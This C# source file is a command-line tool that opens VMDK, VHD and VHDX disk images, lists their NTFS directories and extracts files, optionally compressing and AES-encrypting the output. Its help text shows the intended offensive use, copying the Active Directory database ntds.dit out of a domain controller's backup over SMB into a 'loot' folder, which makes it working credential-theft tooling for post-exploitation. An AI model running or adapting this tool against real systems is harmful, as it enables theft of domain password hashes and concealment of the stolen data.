using System;
using System.IO;
using System.IO.Compression;
using System.Security.Cryptography;
using DiscUtils;
using DiscUtils.Ntfs;
using DiscUtils.Setup;
using System.Collections.Generic;
using DiscUtils.Vhd;



namespace vmdk
{
    class Program
    {

        // A flag key is exactly "-" + one letter (e.g. -s, -p). Anything else is a value.
        // This lets passwords/paths that start with "-" be passed without quoting tricks.
        private static bool IsFlag(string s) => s.Length == 2 && s[0] == '-' && char.IsLetter(s[1]);

        // First non-flag arg is the command. Flags: -key value, or bare -flag → "true".
        private static Dictionary<string, string> ParseArgs(string[] args)
        {
            var opts = new Dictionary<string, string>(StringComparer.OrdinalIgnoreCase);
            for (int i = 0; i < args.Length; i++)
            {
                if (!IsFlag(args[i]))
                {
                    if (!opts.ContainsKey("cmd")) opts["cmd"] = args[i];
                    continue;
                }
                string key = args[i];
                string val = (i + 1 < args.Length && !IsFlag(args[i + 1])) ? args[++i] : "true";
                opts[key] = val;
            }
            return opts;
        }

        private static string Opt(Dictionary<string, string> opts, string key)
        {
            string v;
            return opts.TryGetValue(key, out v) ? v : null;
        }

        static void Main(string[] args)
        {
            SetupHelper.RegisterAssembly(typeof(NtfsFileSystem).Assembly);
            SetupHelper.RegisterAssembly(typeof(DiscUtils.Vmdk.Disk).Assembly);
            SetupHelper.RegisterAssembly(typeof(VirtualDiskManager).Assembly);
            SetupHelper.RegisterAssembly(typeof(VirtualDisk).Assembly);
            SetupHelper.RegisterAssembly(typeof(DiscUtils.Vhd.Disk).Assembly);
            SetupHelper.RegisterAssembly(typeof(DiscUtils.Vhdx.Disk).Assembly);

            var opts = ParseArgs(args);
            string command = (Opt(opts, "cmd") ?? "").ToLower();

            try
            {
                switch (command)
                {
                    case "dir":
                        if (Opt(opts, "-s") == null) { GetHelp(); return; }
                        GetDirListing(Opt(opts, "-s"), Opt(opts, "-d"));
                        break;

                    case "cp":
                        if (Opt(opts, "-s") == null || Opt(opts, "-f") == null || Opt(opts, "-o") == null)
                        { GetHelp(); return; }
                        GetFile(Opt(opts, "-s"), Opt(opts, "-f"), Opt(opts, "-o"),
                            opts.ContainsKey("-z"), Opt(opts, "-p"));
                        break;

                    case "decrypt":
                        if (Opt(opts, "-s") == null || Opt(opts, "-o") == null)
                        { GetHelp(); return; }
                        DecryptFile(Opt(opts, "-s"), Opt(opts, "-o"), Opt(opts, "-p"));
                        break;

                    default:
                        GetHelp();
                        break;
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("\r\n [!] An exception occured: {0}", ex);
                throw;
            }
        }

        public static void GetHelp()
        {
            Console.WriteLine("\r\nvVvVvVvVmMmMmMmMdDdDdDdDkKkKkKkK");
            Console.WriteLine("K   Virtual Disk mounter v0.2  K");
            Console.WriteLine("vVvVvVvVmMmMmMmMdDdDdDdDkKkKkKkK");
            Console.WriteLine("\r\n Usage:  vmdk.exe <command> [flags]\r\n");
            Console.WriteLine(" dir     -s <disk> [-d <directory>]");
            Console.WriteLine("   -s   Virtual disk path (VMDK/VHD/VHDX, SMB paths ok)");
            Console.WriteLine("   -d   Guest directory to list (default: root)\r\n");
            Console.WriteLine(" cp      -s <disk> -f <file> -o <dest> [-z] [-p <pass>]");
            Console.WriteLine("   -s   Virtual disk path");
            Console.WriteLine("   -f   Guest file path to extract");
            Console.WriteLine("   -o   Local destination path");
            Console.WriteLine("   -z   GZip-compress the output");
            Console.WriteLine("   -p   AES-256 encrypt with password (combine with -z to compress then encrypt)\r\n");
            Console.WriteLine(" decrypt -s <vmce> -o <dest> [-p <pass>]");
            Console.WriteLine("   -s   Encrypted/compressed VMCE file");
            Console.WriteLine("   -o   Output path");
            Console.WriteLine("   -p   Password (required if encrypted)\r\n");
            Console.WriteLine(" Examples:");
            Console.WriteLine("   vmdk.exe dir -s \\\\backupserver\\dc01\\dc01.vhdx -d \\Windows\\System32");
            Console.WriteLine("   vmdk.exe cp  -s \\\\backupserver\\dc01\\dc01.vhdx -f \\NTDS\\ntds.dit -o C:\\loot\\ntds.vmce -p Sup3rS3cr3t");
            Console.WriteLine("   vmdk.exe decrypt -s C:\\loot\\ntds.vmce -o C:\\loot\\ntds.dit -p Sup3rS3cr3t");
        }

        // Normalize a guest path so it always starts with a single backslash, as DiscUtils NTFS expects.
        private static string NormalizePath(string path)
        {
            if (string.IsNullOrEmpty(path))
                return "\\";
            return "\\" + path.TrimStart('\\');
        }

        public static void GetDirListing(string DiskPath, string directory)
        {
            if (!File.Exists(DiskPath))
            {
                Console.WriteLine("\r\n [!] The provided disk image does not exist or cannot be accessed");
                return;
            }

            string normalizedDir = NormalizePath(directory);

            try
            {
                using (VirtualDisk vhdx = VirtualDisk.OpenDisk(DiskPath, FileAccess.Read))
                {
                    VolumeManager volMgr = new VolumeManager();
                    volMgr.AddDisk(vhdx);

                    if (vhdx.Partitions.Count > 1)
                    {
                        Console.WriteLine("\r\n[*] Target has more than one partition\r\n");
                        foreach (var physVol in volMgr.GetPhysicalVolumes())
                        {
                            Console.WriteLine("      Identity: " + physVol.Identity);
                            Console.WriteLine("          Type: " + physVol.VolumeType);
                            Console.WriteLine("       Disk Id: " + physVol.DiskIdentity);
                            Console.WriteLine("      Disk Sig: " + physVol.DiskSignature.ToString("X8"));
                            Console.WriteLine("       Part Id: " + physVol.PartitionIdentity);
                            Console.WriteLine("        Length: " + physVol.Length + " bytes");
                            Console.WriteLine(" Disk Geometry: " + physVol.PhysicalGeometry);
                            Console.WriteLine("  First Sector: " + physVol.PhysicalStartSector);
                            Console.WriteLine();

                            var detectedFs = FileSystemManager.DetectFileSystems(physVol);
                            if (detectedFs.Length == 0 || detectedFs[0].Name != "NTFS")
                            {
                                Console.WriteLine("[*] Partition {0} is not NTFS ({1}), skipping\r\n",
                                    physVol.Identity,
                                    detectedFs.Length > 0 ? detectedFs[0].Name : "unknown");
                                continue;
                            }

                            using (NtfsFileSystem vhdbNtfs = new NtfsFileSystem(physVol.Partition.Open()))
                            {
                                if (vhdbNtfs.DirectoryExists(normalizedDir))
                                {
                                    foreach (var file in vhdbNtfs.GetFiles(normalizedDir))
                                        Console.WriteLine("[F] {0}  {1}", file, vhdbNtfs.GetFileLength(file));
                                    foreach (var dir in vhdbNtfs.GetDirectories(normalizedDir))
                                        Console.WriteLine("[D] {0}", dir);
                                }
                                else
                                {
                                    Console.WriteLine("\r\n[*] Directory does not exist in partition {0}\r\n",
                                        physVol.Identity);
                                }
                            }
                        }
                    }
                    else
                    {
                        if (vhdx.Partitions.Count == 0)
                        {
                            Console.WriteLine("\r\n[*] Disk has no partitions");
                            return;
                        }
                        Console.WriteLine("\r\n[*] Found only one partition\r\n");
                        Console.WriteLine("LOGICAL VOLUMES");
                        foreach (var logVol in volMgr.GetLogicalVolumes())
                        {
                            Console.WriteLine("      Identity: " + logVol.Identity);
                            Console.WriteLine("        Length: " + logVol.Length + " bytes");
                            Console.WriteLine(" Disk Geometry: " + logVol.PhysicalGeometry);
                            Console.WriteLine("  First Sector: " + logVol.PhysicalStartSector);
                            Console.WriteLine();
                        }

                        DiscUtils.FileSystemInfo[] detectedFs;
                        using (Stream partStream = vhdx.Partitions[0].Open())
                            detectedFs = FileSystemManager.DetectFileSystems(partStream);

                        if (detectedFs.Length == 0 || detectedFs[0].Name != "NTFS")
                        {
                            Console.WriteLine("[*] Partition is not NTFS ({0}), cannot list",
                                detectedFs.Length > 0 ? detectedFs[0].Name : "unknown");
                        }
                        else
                        {
                            using (NtfsFileSystem vhdbNtfs = new NtfsFileSystem(vhdx.Partitions[0].Open()))
                            {
                                if (vhdbNtfs.DirectoryExists(normalizedDir))
                                {
                                    foreach (var file in vhdbNtfs.GetFiles(normalizedDir))
                                        Console.WriteLine("[F] {0}  {1}", file, vhdbNtfs.GetFileLength(file));
                                    foreach (var dir in vhdbNtfs.GetDirectories(normalizedDir))
                                        Console.WriteLine("[D] {0}", dir);
                                }
                                else
                                {
                                    Console.WriteLine("\r\n[*] Directory does not exist");
                                }
                            }
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("Exception {0}", ex);
            }
        }


        public static void GetFile(string DiskPath, string FilePath, string DestinationFile,
            bool compress = false, string password = null)
        {
            if (!File.Exists(DiskPath))
            {
                Console.WriteLine("\r\n [!] The provided disk image does not exist or cannot be accessed");
                return;
            }
            string destDir = Path.GetDirectoryName(DestinationFile);
            if (!string.IsNullOrEmpty(destDir) && !Directory.Exists(destDir))
            {
                Console.WriteLine("\r\n [!] The destination folder does not exist");
                return;
            }

            if (Path.GetFileName(DestinationFile) == "")
                DestinationFile += Path.GetFileName(FilePath);

            string normalizedPath = NormalizePath(FilePath);

            using (VirtualDisk disk = VirtualDisk.OpenDisk(DiskPath, FileAccess.Read))
            {
                VolumeManager volMgr = new VolumeManager();
                volMgr.AddDisk(disk);

                if (disk.Partitions.Count > 1)
                {
                    Console.WriteLine("\r\n[*] Target has more than one partition\r\n");
                    foreach (var physVol in volMgr.GetPhysicalVolumes())
                    {
                        Console.WriteLine("      Identity: " + physVol.Identity);
                        Console.WriteLine("          Type: " + physVol.VolumeType);
                        Console.WriteLine("       Disk Id: " + physVol.DiskIdentity);
                        Console.WriteLine("      Disk Sig: " + physVol.DiskSignature.ToString("X8"));
                        Console.WriteLine("       Part Id: " + physVol.PartitionIdentity);
                        Console.WriteLine("        Length: " + physVol.Length + " bytes");
                        Console.WriteLine(" Disk Geometry: " + physVol.PhysicalGeometry);
                        Console.WriteLine("  First Sector: " + physVol.PhysicalStartSector);
                        Console.WriteLine();

                        var detectedFs = FileSystemManager.DetectFileSystems(physVol);
                        if (detectedFs.Length == 0 || detectedFs[0].Name != "NTFS")
                        {
                            Console.WriteLine("[*] Partition {0} is not NTFS ({1}), skipping\r\n",
                                physVol.Identity,
                                detectedFs.Length > 0 ? detectedFs[0].Name : "unknown");
                            continue;
                        }

                        using (NtfsFileSystem diskntfs = new NtfsFileSystem(physVol.Partition.Open()))
                        {
                            if (diskntfs.FileExists(normalizedPath))
                            {
                                long srcLength = diskntfs.GetFileLength(normalizedPath);
                                using (Stream bootStream = diskntfs.OpenFile(normalizedPath, FileMode.Open, FileAccess.Read))
                                    WriteCompressedEncrypted(bootStream, DestinationFile, compress, password);

                                if (!compress && string.IsNullOrEmpty(password))
                                {
                                    long dstLength = new FileInfo(DestinationFile).Length;
                                    if (srcLength != dstLength)
                                        Console.WriteLine("[!] Something went wrong. Source {0} bytes, destination {1} bytes",
                                            srcLength, dstLength);
                                }
                                Console.WriteLine("\r\n[*] File {0} was successfully copied to {1}", FilePath, DestinationFile);
                                break;
                            }
                            else
                            {
                                Console.WriteLine("\r\n [!] File {0} can not be found in partition {1}", FilePath, physVol.Identity);
                            }
                        }
                    }
                }
                else
                {
                    foreach (var physVol in volMgr.GetPhysicalVolumes())
                    {
                        Console.WriteLine("      Identity: " + physVol.Identity);
                        Console.WriteLine("          Type: " + physVol.VolumeType);
                        Console.WriteLine("       Disk Id: " + physVol.DiskIdentity);
                        Console.WriteLine("      Disk Sig: " + physVol.DiskSignature.ToString("X8"));
                        Console.WriteLine("       Part Id: " + physVol.PartitionIdentity);
                        Console.WriteLine("        Length: " + physVol.Length + " bytes");
                        Console.WriteLine(" Disk Geometry: " + physVol.PhysicalGeometry);
                        Console.WriteLine("  First Sector: " + physVol.PhysicalStartSector);
                        Console.WriteLine();

                        var detectedFs = FileSystemManager.DetectFileSystems(physVol);
                        if (detectedFs.Length == 0 || detectedFs[0].Name != "NTFS")
                        {
                            Console.WriteLine("[*] Partition {0} is not NTFS ({1}), skipping\r\n",
                                physVol.Identity,
                                detectedFs.Length > 0 ? detectedFs[0].Name : "unknown");
                            continue;
                        }

                        using (NtfsFileSystem diskntfs = new NtfsFileSystem(physVol.Partition.Open()))
                        {
                            if (diskntfs.FileExists(normalizedPath))
                            {
                                long srcLength = diskntfs.GetFileLength(normalizedPath);
                                using (Stream bootStream = diskntfs.OpenFile(normalizedPath, FileMode.Open, FileAccess.Read))
                                    WriteCompressedEncrypted(bootStream, DestinationFile, compress, password);

                                if (!compress && string.IsNullOrEmpty(password))
                                {
                                    long dstLength = new FileInfo(DestinationFile).Length;
                                    if (srcLength != dstLength)
                                        Console.WriteLine("[!] Something went wrong. Source {0} bytes, destination {1} bytes",
                                            srcLength, dstLength);
                                }
                                Console.WriteLine("\r\n[*] File {0} was successfully copied to {1}", FilePath, DestinationFile);
                                break;
                            }
                            else
                            {
                                Console.WriteLine("\r\n [!] File {0} can not be found", FilePath);
                            }
                        }
                    }
                }
            }
        }

        // Output format (when compress or password is given):
        //   [4]  magic "VMCE"
        //   [1]  flags: bit0=compressed, bit1=encrypted
        //   [16] salt  (only when encrypted)
        //   [16] IV    (only when encrypted)
        //   [N]  AES-256-CBC( [GZip(] plaintext [)] )   -- layers depend on flags
        //
        // Key = SHA-256(UTF8(password) || salt)  — 32 bytes, instant derivation.
        // IV  = random 16 bytes stored in the header.
        // Reads exactly count bytes, retrying on short reads (common over SMB).
        private static bool ReadExact(Stream s, byte[] buf, int count)
        {
            int total = 0;
            while (total < count)
            {
                int n = s.Read(buf, total, count - total);
                if (n == 0) return false;
                total += n;
            }
            return true;
        }

        private static byte[] DeriveKey(string password, byte[] salt)
        {
            byte[] pwd = System.Text.Encoding.UTF8.GetBytes(password);
            byte[] buf = new byte[pwd.Length + salt.Length];
            Buffer.BlockCopy(pwd, 0, buf, 0, pwd.Length);
            Buffer.BlockCopy(salt, 0, buf, pwd.Length, salt.Length);
            using (var sha = SHA256.Create())
                return sha.ComputeHash(buf);
        }

        private static void WriteCompressedEncrypted(Stream source, string destinationPath,
            bool compress, string password)
        {
            bool encrypt = !string.IsNullOrEmpty(password);
            bool completed = false;

            try
            {
                using (FileStream fileStream = File.Create(destinationPath))
                {
                    if (!compress && !encrypt)
                    {
                        source.CopyTo(fileStream);
                        completed = true;
                        return;
                    }

                    fileStream.Write(new byte[] { (byte)'V', (byte)'M', (byte)'C', (byte)'E' }, 0, 4);
                    fileStream.WriteByte((byte)((compress ? 1 : 0) | (encrypt ? 2 : 0)));

                    // Build write chain: source → [gzip] → [crypto] → fileStream
                    Stream outputStream = fileStream;
                    CryptoStream cryptoStream = null;

                    if (encrypt)
                    {
                        byte[] salt = new byte[16], iv = new byte[16];
                        using (var rng = new RNGCryptoServiceProvider())
                        {
                            rng.GetBytes(salt);
                            rng.GetBytes(iv);
                        }

                        fileStream.Write(salt, 0, 16);
                        fileStream.Write(iv, 0, 16);

                        var aes = new AesCryptoServiceProvider { Key = DeriveKey(password, salt), IV = iv, Mode = CipherMode.CBC, Padding = PaddingMode.PKCS7 };
                        cryptoStream = new CryptoStream(fileStream, aes.CreateEncryptor(), CryptoStreamMode.Write);
                        aes.Dispose();
                        outputStream = cryptoStream;
                    }

                    if (compress)
                    {
                        // using ensures gzip trailer + CryptoStream.FlushFinalBlock are written even on exception
                        using (var gzip = new GZipStream(outputStream, CompressionMode.Compress))
                            source.CopyTo(gzip);
                        // gzip Dispose: writes trailer → CryptoStream.FlushFinalBlock → fileStream.Close
                        cryptoStream = null; // disposed through the chain
                    }
                    else
                    {
                        try
                        {
                            source.CopyTo(outputStream);
                            outputStream.Close(); // CryptoStream: FlushFinalBlock → fileStream.Close
                            cryptoStream = null;
                        }
                        catch
                        {
                            try { cryptoStream?.Close(); } catch { }
                            cryptoStream = null;
                            throw;
                        }
                    }
                }
                completed = true;
            }
            finally
            {
                if (!completed)
                    try { File.Delete(destinationPath); } catch { }
            }
        }

        public static void DecryptFile(string SourcePath, string DestinationPath, string password)
        {
            if (!File.Exists(SourcePath))
            {
                Console.WriteLine("\r\n [!] Source file not found");
                return;
            }
            string destDir = Path.GetDirectoryName(DestinationPath);
            if (!string.IsNullOrEmpty(destDir) && !Directory.Exists(destDir))
            {
                Console.WriteLine("\r\n [!] Destination folder does not exist");
                return;
            }

            using (FileStream inStream = File.Open(SourcePath, FileMode.Open, FileAccess.Read))
            {
                byte[] magic = new byte[4];
                if (!ReadExact(inStream, magic, 4) ||
                    magic[0] != (byte)'V' || magic[1] != (byte)'M' ||
                    magic[2] != (byte)'C' || magic[3] != (byte)'E')
                {
                    Console.WriteLine("\r\n [!] Not a VMCE file");
                    return;
                }

                int flagByte = inStream.ReadByte();
                if (flagByte < 0) { Console.WriteLine("\r\n [!] Truncated VMCE file"); return; }
                bool compressed = (flagByte & 1) != 0;
                bool encrypted = (flagByte & 2) != 0;

                // Build read chain: inStream → [crypto] → [gzip] → outStream
                Stream dataStream = inStream;

                if (encrypted)
                {
                    if (string.IsNullOrEmpty(password))
                    {
                        Console.WriteLine("\r\n [!] File is encrypted; --password is required");
                        return;
                    }

                    byte[] salt = new byte[16], iv = new byte[16];
                    if (!ReadExact(inStream, salt, 16) || !ReadExact(inStream, iv, 16))
                    {
                        Console.WriteLine("\r\n [!] Truncated VMCE file (missing salt/IV)");
                        return;
                    }

                    var aes = new AesCryptoServiceProvider { Key = DeriveKey(password, salt), IV = iv, Mode = CipherMode.CBC, Padding = PaddingMode.PKCS7 };
                    dataStream = new CryptoStream(inStream, aes.CreateDecryptor(), CryptoStreamMode.Read);
                    aes.Dispose();
                }

                using (FileStream outStream = File.Create(DestinationPath))
                {
                    if (compressed)
                    {
                        using (var gzip = new GZipStream(dataStream, CompressionMode.Decompress))
                            gzip.CopyTo(outStream);
                    }
                    else
                    {
                        dataStream.CopyTo(outStream);
                        if (!ReferenceEquals(dataStream, inStream))
                            dataStream.Dispose();
                    }
                }
            }

            Console.WriteLine("\r\n[*] File decrypted to {0}", DestinationPath);
        }
    }
}
